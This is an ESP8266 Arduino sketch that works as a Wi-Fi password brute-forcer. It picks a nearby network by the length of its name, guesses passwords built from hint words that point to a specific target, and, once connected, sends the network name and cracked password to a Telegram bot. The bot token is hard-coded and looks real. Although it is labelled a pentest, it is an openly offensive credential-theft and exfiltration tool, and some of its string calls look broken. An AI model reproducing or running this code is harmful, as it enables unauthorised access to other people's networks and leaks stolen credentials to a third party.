#include <ESP8266WiFi.h>
#include <ESP8266HTTPClient.h>

const char* BOT_TOKEN = "8572045859:AAFKy2zToOTBbWMVHniuHY0fFrOX2Kh6ui8";  // Replace
const char* CHAT_ID = "8572045859";     // Replace

const int LED_PIN = 2;  // D4

String TARGET_SSID = "";
String FOUND_PASS = "";
bool CRACKED = false;
bool CONNECTED = false;

String hints[] = {"govt", "18", "spd", "school", "@", "(", ")", "-"};
int hintCount = 8;

void setup() {
  Serial.begin(115200);
  pinMode(LED_PIN, OUTPUT);
  digitalWrite(LED_PIN, HIGH);
  
  Serial.println("\n🔥 ESP8266 WIFI CRACKER v1.0");
  delay(2000);
  
  findTarget();
}

void loop() {
  if (!CRACKED) {
    bruteForce();
  } else if (!CONNECTED) {
    connectAndNotify();
  }
  delay(100);
}

void findTarget() {
  Serial.println("📡 Scanning...");
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  delay(2000);
  
  int n = WiFi.scanNetworks();
  int maxLen = 0;
  
  for (int i = 0; i < n; i++) {
    String ssid = WiFi.SSID(i);
    int len = ssid.length();
    if (len > maxLen && len >= 14 && len <= 17) {
      maxLen = len;
      TARGET_SSID = ssid;
    }
    Serial.printf("  %s (%d chars)\n", ssid.c_str(), len);
  }
  
  Serial.printf("🎯 TARGET: %s (%d chars)\n", TARGET_SSID.c_str(), TARGET_SSID.length());
  Serial.println("🔑 Starting brute force...");
}

void bruteForce() {
  static int attempt = 0;
  static unsigned long lastPrint = 0;
  
  // 🔥 Generate 14-17 char passwords from hints
  String pass = generatePassword(attempt);
  
  WiFi.begin(TARGET_SSID.c_str(), pass.c_str());
  delay(3000);
  
  if (WiFi.status() == WL_CONNECTED) {
    FOUND_PASS = pass;
    CRACKED = true;
    Serial.printf("✅ CRACKED! PASS: %s\n", FOUND_PASS.c_str());
    blinkPattern(40, 150);  // 40 BLINKS!
    return;
  }
  
  attempt++;
  
  // Progress
  if (millis() - lastPrint > 10000) {
    Serial.printf("🔄 Attempts: %d | Trying: %s\n", attempt, pass.c_str());
    lastPrint = millis();
    blinkPattern(1, 50);
  }
}

String generatePassword(int index) {
  String pass = "";
  
  // 🔥 Hint combinations (14-17 chars)
  int len = 14 + (index % 4);  // 14-17 chars
  
  // Base patterns
  String bases[] = {
    "govt18spd", "school18govt", "spd18school", "govtschoolspd",
    "18govt_spd", "school@govt", "govt-school", "spd-school18"
  };
  
  if (index < 8) {
    pass = bases[index];
    while (pass.length() < len) pass += random(0, 10);  // Pad digits
  } else {
    // Advanced combinations
    for (int i = 0; i < len; i++) {
      int h = random(0, hintCount);
      pass += hints[h];
      if (random(0, 3) == 0) pass += random(0, 10);  // Random digit
    }
  }
  
  // Add special chars
  if (random(0, 3) == 0) pass.replace(pass.length()-1, 1, "@");
  if (random(0, 4) == 0) pass.replace(pass.length()-2, 1, "-");
  
  return pass;
}

void connectAndNotify() {
  WiFi.disconnect();
  WiFi.begin(TARGET_SSID.c_str(), FOUND_PASS.c_str());
  delay(5000);
  
  if (WiFi.status() == WL_CONNECTED) {
    CONNECTED = true;
    Serial.println("🌐 Internet connected!");
    
    // Telegram notification
    sendTelegram("🎉 CRACKED!\nSSID: " + TARGET_SSID + "\nPASS: " + FOUND_PASS);
    
    // Success blink
    blinkPattern(10, 200);
    Serial.println("✅ PENTEST COMPLETE!");
  }
}

void sendTelegram(String msg) {
  if (WiFi.status() == WL_CONNECTED) {
    HTTPClient http;
    http.begin("https://api.telegram.org/bot" + String(BOT_TOKEN) + 
               "/sendMessage?chat_id=" + String(CHAT_ID) + "&text=" + urlEncode(msg));
    http.GET();
    http.end();
    Serial.println("📱 Telegram sent");
  }
}

void blinkPattern(int count, int delayMs) {
  for (int i = 0; i < count; i++) {
    digitalWrite(LED_PIN, LOW);
    delay(delayMs);
    digitalWrite(LED_PIN, HIGH);
    delay(delayMs);
  }
}

String urlEncode(String str) {
  String encoded = "";
  for (int i = 0; i < str.length(); i++) {
    char c = str.charAt(i);
    if (isAlphaNumeric(c)) {
      encoded += c;
    } else {
      encoded += '%' + String((byte)c >> 4, HEX) + String((byte)c & 0xF, HEX);
    }
  }
  return encoded;
}
